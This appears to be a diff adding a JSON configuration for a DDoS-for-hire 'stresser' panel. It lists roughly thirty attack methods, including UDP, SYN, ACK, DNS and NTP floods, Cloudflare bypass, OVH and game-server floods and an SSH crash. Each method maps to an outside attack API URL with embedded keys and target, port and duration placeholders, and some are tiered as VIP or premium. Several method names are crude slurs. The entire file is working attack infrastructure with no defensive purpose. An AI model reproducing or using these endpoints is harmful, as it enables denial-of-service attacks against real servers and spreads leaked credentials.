@@ -1,0 +1,352 @@
+{
+	"methods": [
+        {
+            "name": "ldap",
+            "description": "",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-UDPV2"
+            }
+        },
+        {
+            "name": "home-rape",
+            "description": "home rape method",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-DNS"
+            }
+        },
+        {
+            "name": "udp-flood",
+            "description": "udp-flood method (200 MAX)",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-UDPBYPASS"
+            }
+        },
+        {
+            "name": "dstat-vip",
+            "description": "udp-flood method",
+            "enabled": false,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://beamapi.xyz/api/attack?username=pyro&key=rewsgergherer&host=[target]&port=[port]&time=[time]&method=DSTAT"
+            }
+        },
+        {
+            "name": "game-vip",
+            "description": "vip game method",
+            "enabled": true,
+
+            "vip": true,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-GAME"
+            }
+        },
+        {
+            "name": "game-prem",
+            "description": "premium game method",
+            "enabled": true,
+
+            "vip": false,
+            "premium": true,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-GAME"
+            }
+        },
+        {
+            "name": "ntp-x",
+            "description": "premium game method",
+            "enabled": false,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "http://137.74.148.85/vip?user=vmfe&key=dqqlg32izn&host=[target]&port=[port]&time=[time]&method=NTP"
+           }
+        },
+        {
+            "name": "tcp-out",
+            "description": "used for nfos not ovhs atm and other tcp stuff",
+            "enabled": false,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "http://137.74.148.85/vip?user=vmfe&key=dqqlg32izn&host=[target]&port=[port]&time=[time]&method=TCP"
+            }
+        },
+        {
+            "name": "stdhex",
+            "description": "std hex method",
+            "enabled": false,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://raw.yumeko.army/attack?user=down&pass=memum&target=[target]&port=[port]&method=std&time=[time]"
+            }
+        },
+        {
+            "name": "raw-net",
+            "description": "raw game method",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-RAWGAME"
+            }
+        },
+        {
+            "name": "syn-flood",
+            "description": "syn method",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-SYNBYPASS"
+            }
+        },
+        {
+            "name": "tcpv2",
+            "description": "tcpv2 method",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-UDPV2"
+            }
+        },
+        {
+            "name": "cfbypass",
+            "description": "cloudflare byapass",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-UAMBYPASS"
+            }
+        },
+        {
+            "name": "http-star",
+            "description": "http method",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-POSTBYPASS"
+            }
+        },
+        {
+            "name": "ovh-reload",
+            "description": "ovh amp method",
+            "enabled": false,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://beamapi.xyz/api/attack?username=pyro&key=rewsgergherer&host=[target]&port=[port]&time=[time]&method=OVH-INTERNAL"
+            }
+        },
+        {
+            "name": "sshcrash",
+            "description": "",
+            "enabled": false,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "http://137.74.148.85/vip?user=vmfe&key=dqqlg32izn&host=[target]&port=[port]&time=[time]&method=SSHCRASH"
+            }
+        },
+        {
+            "name": "nfo-tcp",
+            "description": "",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-NFOV2"
+            }
+        },
+        {
+            "name": "nfo-udp",
+            "description": "",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-NFOV1"
+            }
+        },
+        {
+            "name": "ovh-yakari",
+            "description": "",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-KILLALLBETA"
+            }
+        },
+        {
+            "name": "ovh-tcp",
+            "description": "",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-OVHV3"
+            }
+        },
+        {
+            "name": "ovh-beta",
+            "description": "",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-OVHGAME"
+            }
+        },
+        {
+            "name": "game-die",
+            "description": "",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-GAME"
+            }
+        },
+        {
+            "name": "hydra-x",
+            "description": "",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-SYNBYPASS"
+            }
+        },
+        {
+            "name": "fortnite-x",
+            "description": "",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-FORTNITE"
+            }
+        },
+        {
+            "name": "vpn-rape",
+            "description": "",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "https://api.leakz.org/fbiVIP.php?key=yoda.133726dsdf892t902&host=[target]&port=[port]&time=[time]&method=LKZ-KILLALLBETA"
+            }
+        },
+        {
+            "name": "https-die",
+            "description": "",
+            "enabled": false,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "http://23.88.113.84/path.php?host=[target]&port=[port]&time=[time]&method=HTTPS-REQUEST&key=path-apikeyakira"
+            }
+        },
+        {
+            "name": "http-get",
+            "description": "",
+            "enabled": false,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "http://23.88.113.84/path.php?host=[target]&port=[port]&time=[time]&method=HTTP-GET&key=path-apikeyakira"
+            }
+        },
+        {
+            "name": "ack-v",
+            "description": "",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "http://23.88.113.84/path.php?host=[target]&port=[port]&time=[time]&method=ACK-FLOOD&key=path-apikeyakira"
+            }
+        },
+        {
+            "name": "stdhex-xv",
+            "description": "",
+            "enabled": true,
+
+            "vip": false,
+            "premium": false,
+            "home": true,
+            "Links": {
+                "url": "http://23.88.113.84/path.php?host=[target]&port=[port]&time=[time]&method=STDHEX-FLOOD&key=path-apikeyakira"
+            }
+        }
+    ]
+}
